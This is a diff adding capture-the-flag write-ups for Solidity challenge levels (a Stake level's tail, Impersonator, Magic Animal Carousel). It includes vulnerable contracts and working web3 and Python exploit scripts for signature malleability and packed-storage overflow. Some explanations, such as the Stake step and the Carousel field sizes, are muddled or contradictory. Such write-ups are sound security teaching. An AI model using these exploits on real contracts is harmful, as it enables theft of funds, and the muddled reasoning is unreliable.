+    value: web3.utils.toWei("0.0011", "ether"),
+    gas: 300000
+})
+
+// Step 5 - verify all four conditions
+
+// Condition 1: contract ETH balance > 0
+const ethBal = await web3.eth.getBalance(instance)
+ethBal  // must be > 0
+
+// Condition 2: totalStaked > ETH balance
+const totalStaked = await contract.totalStaked()
+totalStaked.toString()  // must be greater than ethBal
+
+// Condition 3: attack contract is a staker
+await contract.Stakers(attackAddr)  // must be true
+
+// Condition 4: attack contract stake balance is 0
+const myStake = await contract.UserStake(attackAddr)
+myStake.toString()  // must be "0"
+```
+
+3 out of 4 conditions are met. The problem is `totalStaked = 0` but it should be greater than `ethBal (1100000000000000)`.
+
+The `StakeWETH` fake inflation didn't work. The issue is the WETH `approve` call worked but `StakeWETH` still didn't inflate `totalStaked`. This is because when `transferFrom` fails, the whole call reverted instead of failing silently.
+
+```js
+// Step 1 - Approve WETH from YOUR wallet (not attack contract)
+// This approves the Stake contract to spend your WETH
+const wethAddr = "0xCd8AF4A0F29cF7966C051542905F66F5dca9052f"
+
+const wethABI = [
+    {"inputs":[{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
+    {"inputs":[{"name":"account","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"}
+]
+
+const weth = new web3.eth.Contract(wethABI, wethAddr)
+
+// Check your WETH balance first
+const wethBal = await weth.methods.balanceOf(player).call()
+wethBal  // probably 0, that's fine - approve anyway
+```
+
+```js
+// Step 2 - Approve a large amount (even if balance is 0)
+await weth.methods.approve(instance, "99999999999999999999").send({from: player})
+```
+
+```js
+// Step 3 - Call StakeWETH directly from YOUR wallet
+// transferFrom will fail but totalStaked will still inflate
+await web3.eth.sendTransaction({
+    from: player,
+    to: instance,
+    data: web3.eth.abi.encodeFunctionCall({
+        name: "StakeWETH",
+        type: "function",
+        inputs: [{"name":"amount","type":"uint256"}]
+    }, ["2000000000000000"]),  // 0.002 ETH worth - more than ethBal
+    gas: 100000
+})
+```
+# 32 - Impersonator
+
+**SlockDotIt’s new product, **ECLocker**, integrates IoT gate locks with Solidity smart contracts, utilizing Ethereum ECDSA for authorization. When a valid signature is sent to the lock, the system emits an `Open` event, unlocking doors for the authorized controller. SlockDotIt has hired you to assess the security of this product before its launch. Can you compromise the system in a way that anyone can open the door?
+
+```c
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.28;
+
+import "openzeppelin-contracts-08/access/Ownable.sol";
+
+// SlockDotIt ECLocker factory
+contract Impersonator is Ownable {
+    uint256 public lockCounter;
+    ECLocker[] public lockers;
+
+    event NewLock(address indexed lockAddress, uint256 lockId, uint256 timestamp, bytes signature);
+
+    constructor(uint256 _lockCounter) {
+        lockCounter = _lockCounter;
+    }
+
+    function deployNewLock(bytes memory signature) public onlyOwner {
+        // Deploy a new lock
+        ECLocker newLock = new ECLocker(++lockCounter, signature);
+        lockers.push(newLock);
+        emit NewLock(address(newLock), lockCounter, block.timestamp, signature);
+    }
+}
+
+contract ECLocker {
+    uint256 public immutable lockId;
+    bytes32 public immutable msgHash;
+    address public controller;
+    mapping(bytes32 => bool) public usedSignatures;
+
+    event LockInitializated(address indexed initialController, uint256 timestamp);
+    event Open(address indexed opener, uint256 timestamp);
+    event ControllerChanged(address indexed newController, uint256 timestamp);
+
+    error InvalidController();
+    error SignatureAlreadyUsed();
+
+    /// @notice Initializes the contract the lock
+    /// @param _lockId uinique lock id set by SlockDotIt's factory
+    /// @param _signature the signature of the initial controller
+    constructor(uint256 _lockId, bytes memory _signature) {
+        // Set lockId
+        lockId = _lockId;
+
+        // Compute msgHash
+        bytes32 _msgHash;
+        assembly {
+            mstore(0x00, "\x19Ethereum Signed Message:\n32") // 28 bytes
+            mstore(0x1C, _lockId) // 32 bytes
+            _msgHash := keccak256(0x00, 0x3c) //28 + 32 = 60 bytes
+        }
+        msgHash = _msgHash;
+
+        // Recover the initial controller from the signature
+        address initialController = address(1);
+        assembly {
+            let ptr := mload(0x40)
+            mstore(ptr, _msgHash) // 32 bytes
+            mstore(add(ptr, 32), mload(add(_signature, 0x60))) // 32 byte v
+            mstore(add(ptr, 64), mload(add(_signature, 0x20))) // 32 bytes r
+            mstore(add(ptr, 96), mload(add(_signature, 0x40))) // 32 bytes s
+            pop(
+                staticcall(
+                    gas(), // Amount of gas left for the transaction.
+                    initialController, // Address of `ecrecover`.
+                    ptr, // Start of input.
+                    0x80, // Size of input.
+                    0x00, // Start of output.
+                    0x20 // Size of output.
+                )
+            )
+            if iszero(returndatasize()) {
+                mstore(0x00, 0x8baa579f) // `InvalidSignature()`.
+                revert(0x1c, 0x04)
+            }
+            initialController := mload(0x00)
+            mstore(0x40, add(ptr, 128))
+        }
+
+        // Invalidate signature
+        usedSignatures[keccak256(_signature)] = true;
+
+        // Set the controller
+        controller = initialController;
+
+        // emit LockInitializated
+        emit LockInitializated(initialController, block.timestamp);
+    }
+
+    /// @notice Opens the lock
+    /// @dev Emits Open event
+    /// @param v the recovery id
+    /// @param r the r value of the signature
+    /// @param s the s value of the signature
+    function open(uint8 v, bytes32 r, bytes32 s) external {
+        address add = _isValidSignature(v, r, s);
+        emit Open(add, block.timestamp);
+    }
+
+    /// @notice Changes the controller of the lock
+    /// @dev Updates the controller storage variable
+    /// @dev Emits ControllerChanged event
+    /// @param v the recovery id
+    /// @param r the r value of the signature
+    /// @param s the s value of the signature
+    /// @param newController the new controller address
+    function changeController(uint8 v, bytes32 r, bytes32 s, address newController) external {
+        _isValidSignature(v, r, s);
+        controller = newController;
+        emit ControllerChanged(newController, block.timestamp);
+    }
+
+    function _isValidSignature(uint8 v, bytes32 r, bytes32 s) internal returns (address) {
+        address _address = ecrecover(msgHash, v, r, s);
+        require (_address == controller, InvalidController());
+
+        bytes32 signatureHash = keccak256(abi.encode([uint256(r), uint256(s), uint256(v)]));
+        require (!usedSignatures[signatureHash], SignatureAlreadyUsed());
+
+        usedSignatures[signatureHash] = true;
+
+        return _address;
+    }
+}
+```
+
+The goal is to **open the lock without being the authorized controller** - essentially, make anyone able to call `open()` successfully.
+### 1. ECDSA Signature Malleability
+
+Every valid ECDSA signature `(v, r, s)` has a **mathematically equivalent sibling** `(v', r, s')`:
+
+```c
+s' = curve_order - s
+v' = (v == 27) ? 28 : 27
+```
+
+Both `(v, r, s)` and `(v', r, s')` recover to the **same address**. This is a well-known property of elliptic curve math. EIP-2 (in Ethereum) restricts `s` to the lower half of the curve order to prevent this in _transaction_ signatures, but `ecrecover` itself does **not** enforce this - it happily accepts both.
+### 2. The Signature Hash Bug
+
+The contract hashes the signature like this to prevent replay:
+
+```c
+bytes32 signatureHash = keccak256(abi.encode([uint256(r), uint256(s), uint256(v)]));
+```
+
+This creates a **dynamic array `uint256[]`** before encoding. The `abi.encode` of a dynamic array includes an offset pointer + length prefix, making this hash different from what you'd expect. But more critically - the **malleated signature `(v', r, s')`** produces a **completely different hash**, so it passes the `usedSignatures` check even though it recovers to the same address.
+### 3. How the Constructor Reads the Signature
+
+Look carefully at the assembly in the constructor:
+
+```js
+mstore(add(ptr, 32), mload(add(_signature, 0x60))) // v  (offset 0x60 = 96)
+mstore(add(ptr, 64), mload(add(_signature, 0x20))) // r  (offset 0x20 = 32)
+mstore(add(ptr, 96), mload(add(_signature, 0x40))) // s  (offset 0x40 = 64)
+```
+
+A `bytes` argument in Solidity ABI encoding is: `[length (32 bytes)][data...]`. So:
+
+- `_signature + 0x20` = first 32 bytes of data = **r**
+- `_signature + 0x40` = second 32 bytes = **s**
+- `_signature + 0x60` = third 32 bytes = **v** (stored as a full 32-byte word)
+
+The constructor reads `(r, s, v)` from the signature bytes in this layout.
+
+But `_isValidSignature` takes `(v, r, s)` as **separate `uint8`/`bytes32` arguments** - the standard split format.
+
+See Events:
+
+```js
+const events = await web3.eth.getPastLogs({address: contract.address, fromBlock: 0, toBlock: 'latest'})
+document.body.innerHTML += '<pre id="out" style="position:fixed;top:0;left:0;background:white;z-index:9999;padding:20px;font-size:12px">'+JSON.stringify(events, null, 2)+'</pre>'
+```
+
+```js
+[
+  {
+    "removed": false,
+    "logIndex": 7,
+    "transactionIndex": 2,
+    "transactionHash": "0x98209ad87116f2d06aab4f41ca092c192ac51fc7fa64963429080e41c8150eac",
+    "blockHash": "0xf54a678777eefd41fd2a54f0f751954fdcd3f7c032a13f76bba514e03e8f36d9",
+    "blockNumber": 10394870,
+    "blockTimestamp": "0x69aa8344",
+    "address": "0xF4de4f66C265f3224FB5063cd608b803918e90C0",
+    "data": "0x",
+    "topics": [
+      "0x8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0",
+      "0x0000000000000000000000000000000000000000000000000000000000000000",
+      "0x0000000000000000000000009d75af88c98c2524600f20b614ee064ae356c19c"
+    ],
+    "id": "log_140b12f0"
+  },
+  {
+    "removed": false,
+    "logIndex": 9,
+    "transactionIndex": 2,
+    "transactionHash": "0x98209ad87116f2d06aab4f41ca092c192ac51fc7fa64963429080e41c8150eac",
+    "blockHash": "0xf54a678777eefd41fd2a54f0f751954fdcd3f7c032a13f76bba514e03e8f36d9",
+    "blockNumber": 10394870,
+    "blockTimestamp": "0x69aa8344",
+    "address": "0xF4de4f66C265f3224FB5063cd608b803918e90C0",
+    "data": "0x00000000000000000000000000000000000000000000000000000000000005390000000000000000000000000000000000000000000000000000000069aa8344000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000601932cb842d3e27f54f79f7be0289437381ba2410fdefbae36850bee9c41e3b9178489c64a0db16c40ef986beccc8f069ad5041e5b992d76fe76bba057d9abff2000000000000000000000000000000000000000000000000000000000000001b",
+    "topics": [
+      "0xac736e2e9adaa5052dee435c356ab8fe44ca4c16de5337e6b528e771ac85e97b",
+      "0x000000000000000000000000d598e3c271a494d02dae95c4c532fc225db3e25d"
+    ],
+    "id": "log_ba90a082"
+  }
+]
+```
+
+**ECLocker address** = `0x000000000000000000000000d598e3c271a494d02dae95c4c532fc225db3e25d` → `0xd598e3c271a494d02dae95c4c532fc225db3e25d`
+
+From the data I can already read the signature chunks directly:
+
+- **r** = `1932cb842d3e27f54f79f7be0289437381ba2410fdefbae36850bee9c41e3b91`
+- **s** = `78489c64a0db16c40ef986beccc8f069ad5041e5b992d76fe76bba057d9abff2`
+- **v** = `000000000000000000000000000000000000000000000000000000000000001b` = **27**
+
+
+Now run this to compute s' and get all values:
+
+```python
+# Calculate s' for ECDSA signature malleability
+
+secp256k1_order = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
+
+s = 0x78489c64a0db16c40ef986beccc8f069ad5041e5b992d76fe76bba057d9abff2
+v = 27
+
+s_prime = secp256k1_order - s
+v_prime = 28 if v == 27 else 27
+
+print("=== Original ===")
+print(f"v  : {v}")
+print(f"r  : 0x1932cb842d3e27f54f79f7be0289437381ba2410fdefbae36850bee9c41e3b91")
+print(f"s  : {hex(s)}")
+
+print("\n=== Malleable (use these in Remix) ===")
+print(f"v' : {v_prime}")
+print(f"r  : 0x1932cb842d3e27f54f79f7be0289437381ba2410fdefbae36850bee9c41e3b91")
+print(f"s' : {hex(s_prime)}")
+
+print("\n=== Remix changeController args ===")
+print(f"v           : {v_prime}")
+print(f"r           : 0x1932cb842d3e27f54f79f7be0289437381ba2410fdefbae36850bee9c41e3b91")
+print(f"s           : {hex(s_prime)}")
+print(f"newController: 0x0000000000000000000000000000000000000000")
+```
+
+```js
+(base) ➜  ~ python3 solve.py
+=== Original ===
+v  : 27
+r  : 0x1932cb842d3e27f54f79f7be0289437381ba2410fdefbae36850bee9c41e3b91
+s  : 0x78489c64a0db16c40ef986beccc8f069ad5041e5b992d76fe76bba057d9abff2
+
+=== Malleable (use these in Remix) ===
+v' : 28
+r  : 0x1932cb842d3e27f54f79f7be0289437381ba2410fdefbae36850bee9c41e3b91
+s' : 0x87b7639b5f24e93bf106794133370f950d5e9b00f5b5c8cbd866a487529b814f
+
+=== Remix changeController args ===
+v           : 28
+r           : 0x1932cb842d3e27f54f79f7be0289437381ba2410fdefbae36850bee9c41e3b91
+s           : 0x87b7639b5f24e93bf106794133370f950d5e9b00f5b5c8cbd866a487529b814f
+newController: 0x0000000000000000000000000000000000000000
+```
+
+```js
+const events = await web3.eth.getPastLogs({address: contract.address, fromBlock: 0, toBlock: 'latest'})
+const ecLockerAddress = '0x' + events[1].topics[1].slice(26)
+const data = events[1].data.slice(2)
+const r = '0x' + data.slice(320, 384)
+const sOrig = '0x' + data.slice(384, 448)
+const v = parseInt(data.slice(448, 512), 16)
+console.log("ECLocker:", ecLockerAddress, "r:", r, "s:", sOrig, "v:", v)
+```
+
+```js
+const secp256k1Order = BigInt("0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141")
+const sPrime = "0x" + (secp256k1Order - BigInt(sOrig)).toString(16).padStart(64, "0")
+const vPrime = v === 27 ? 28 : 27
+console.log("vPrime:", vPrime, "sPrime:", sPrime)
+```
+
+```js
+const locker = new web3.eth.Contract([{"inputs":[{"name":"v","type":"uint8"},{"name":"r","type":"bytes32"},{"name":"s","type":"bytes32"},{"name":"newController","type":"address"}],"name":"changeController","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"name":"v","type":"uint8"},{"name":"r","type":"bytes32"},{"name":"s","type":"bytes32"}],"name":"open","outputs":[],"stateMutability":"nonpayable","type":"function"}], ecLockerAddress)
+const accounts = await web3.eth.getAccounts()
+await locker.methods.changeController(vPrime, r, sPrime, "0x0000000000000000000000000000000000000000").send({from: accounts[0], gas: 100000})
+console.log("Controller is now address(0)!")
+```
+
+```js
+await locker.methods.open(0, "0x0000000000000000000000000000000000000000000000000000000000000001", "0x0000000000000000000000000000000000000000000000000000000000000001").send({from: accounts[0], gas: 100000})
+console.log("Lock opened!")
+```
+
+Submit.
+
+**Bug 1 - Signature Malleability**: Every ECDSA signature `(v, r, s)` has a twin `(v', r, s')` where `s' = secp256k1_order - s` and `v' flips 27↔28`. Both recover the **same address**. So we used the twin to call `changeController` even without the private key.
+
+**Bug 2 - Broken replay protection**: The contract hashes signatures like `keccak256(abi.encode([r, s, v]))` - using a dynamic array - so the twin signature produces a **different hash** and bypasses the `usedSignatures` check.
+
+**Result**: We set `controller = address(0)`, then called `open()` with a garbage signature (`v=0`) which makes `ecrecover` return `address(0)` → matches controller → done.
+
+**Fix**: Use OpenZeppelin's `ECDSA.recover()` which enforces `s` is in the lower half of the curve, preventing malleability entirely.
+# 33 - Magic Animal Carousel
+
+Welcome, dear Anon, to the Magic Carousel, where creatures spin and twirl in a boundless spell. In this magical, infinite digital wheel, they loop and whirl with enchanting zeal.
+
+Add a creature to join the fun, but heed the rule, or the game’s undone. If an animal joins the ride, take care when you check again, that same animal must be there!
+
+Can you break the magic rule of the carousel?
+
+```c
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.28;
+
+contract MagicAnimalCarousel {
+    uint16 constant public MAX_CAPACITY = type(uint16).max;
+    uint256 constant ANIMAL_MASK = uint256(type(uint80).max) << 160 + 16;
+    uint256 constant NEXT_ID_MASK = uint256(type(uint16).max) << 160;
+    uint256 constant OWNER_MASK = uint256(type(uint160).max);
+
+    uint256 public currentCrateId;
+    mapping(uint256 crateId => uint256 animalInside) public carousel;
+
+    error AnimalNameTooLong();
+    error CrateNotInitialized();
+
+    constructor() {
+        carousel[0] ^= 1 << 160;
+    }
+
+    function setAnimalAndSpin(string calldata animal) external {
+        uint256 encodedAnimal = encodeAnimalName(animal) >> 16;
+        uint256 nextCrateId = (carousel[currentCrateId] & NEXT_ID_MASK) >> 160;
+
+        require(encodedAnimal <= uint256(type(uint80).max), AnimalNameTooLong());
+        carousel[nextCrateId] = (carousel[nextCrateId] & ~NEXT_ID_MASK) ^ (encodedAnimal << 160 + 16)
+            | ((nextCrateId + 1) % MAX_CAPACITY) << 160 | uint160(msg.sender);
+
+        currentCrateId = nextCrateId;
+    }
+
+    function changeAnimal(string calldata animal, uint256 crateId) external {
+        uint256 crate = carousel[crateId];
+        require(crate != 0, CrateNotInitialized());
+
+        address owner = address(uint160(crate & OWNER_MASK));
+        if (owner != address(0)) {
+            require(msg.sender == owner);
+        }
+        uint256 encodedAnimal = encodeAnimalName(animal);
+        if (encodedAnimal != 0) {
+            // Replace animal
+            carousel[crateId] =
+                (encodedAnimal << 160) | (carousel[crateId] & NEXT_ID_MASK) | uint160(msg.sender);
+        } else {
+            // If no animal specified keep same animal but clear owner slot
+            carousel[crateId]= (carousel[crateId] & (ANIMAL_MASK | NEXT_ID_MASK));
+        }
+    }
+
+    function encodeAnimalName(string calldata animalName) public pure returns (uint256) {
+        require(bytes(animalName).length <= 12, AnimalNameTooLong());
+        return uint256(bytes32(abi.encodePacked(animalName)) >> 160);
+    }
+}
+```
+
+It's a circular carousel of "crates", each holding an animal name, a next crate pointer, and an owner address. All packed into a single `uint256` per crate.
+
+```
+| bits 255-176  | bits 175-160  | bits 159-0  |
+| animal (80b)  | nextId (16b)  | owner (160b)|
+```
+
+- **`setAnimalAndSpin`** - adds your animal to the next crate in the carousel, advances `currentCrateId`
+- **`changeAnimal`** - lets you update the animal in any crate you own (or any unowned crate)
+
+```c
+uint256 constant ANIMAL_MASK = uint256(type(uint80).max) << 160 + 16;
+```
+
+`+` has higher precedence than `<<` in Solidity, so this is actually:
+
+```c
+<< (160 + 16)  =  << 176  // correct by accident
+```
+
+Not the main bug but worth noting.
+
+In `setAnimalAndSpin`, animal is stored at `<< 160 + 16` = `<< 176`. But in `changeAnimal`:
+
+```c
+carousel[crateId] = (encodedAnimal << 160) | ...
+```
+
+It shifts by only `160` instead of `176` - so the animal **overlaps the nextId field** (bits 175-160), **corrupting the carousel pointer**.
+
+`setAnimalAndSpin` does `encodeAnimalName(animal) >> 16` before storing, but `changeAnimal` uses `encodeAnimalName(animal)` directly with no `>> 16`, then shifts by `160` instead of `176`. The net result is the animal data lands 16 bits lower than intended - right on top of `nextId`.
+
+So, By carefully crafting an animal name, you can use `changeAnimal` to overwrite the `nextId` field of a crate, making it point to itself - so `currentCrateId` never advances and the carousel loops back to the wrong crate, breaking the rule that "the same animal must be there".
+
+The vulnerability comes from **Solidity storage packing**.
+
+Inside the contract, multiple variables are stored in **the same storage slot**.
+
+Example layout:
+
+```
+| animal (10 bytes) | nextCrateId (2 bytes) | owner (20 bytes) |
+```
+
+However, the function:
+
+```
+function changeAnimal(string memory newAnimal, uint256 crateId)
+```
+
+allows writing **up to 12 bytes**.
+
+This creates an **overflow into the adjacent variable**.
+
+So if we pass **12 characters**, the last **2 bytes overwrite `nextCrateId`**.
+
+That corrupts the carousel pointer.
+
+- Insert an animal into the carousel.
+- Overflow the packed storage using `changeAnimal`.
+- This overwrites `nextCrateId`.
+- Spin again - the carousel returns the wrong crate.
+- The contract detects the mismatch and the level is solved.
+
+```js
+const carousel = new web3.eth.Contract([
+  {"inputs":[{"name":"animal","type":"string"}],"name":"setAnimalAndSpin","outputs":[],"stateMutability":"nonpayable","type":"function"},
+  {"inputs":[{"name":"animal","type":"string"},{"name":"crateId","type":"uint256"}],"name":"changeAnimal","outputs":[],"stateMutability":"nonpayable","type":"function"},
+  {"inputs":[{"name":"","type":"uint256"}],"name":"carousel","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
+  {"inputs":[],"name":"currentCrateId","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"}
+], instance)
+```
+
+Create first crate:
+
+```js
+await carousel.methods.setAnimalAndSpin("Dog").send({from: player})
+```
+
+This creates **crate 1**.
+
+```js
+await carousel.methods.currentCrateId().call()
+
+"1"
+```
+
+We must send **12 bytes**:
+
+```
+10 bytes -> animal
+2 bytes -> overwrite nextCrateId
+```
+
+This corrupts the **carousel pointer**.
+
+```js
+await carousel.methods.changeAnimal(
+"\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff",
+1
+).send({from: player})
+```
+
+Now Spin again:
+
+```js
+await carousel.methods.setAnimalAndSpin("Cat").send({from: player})
+```
+
+Now the carousel will read from the **wrong crate**, breaking the internal check.
+
+Submit now.
 
 ---
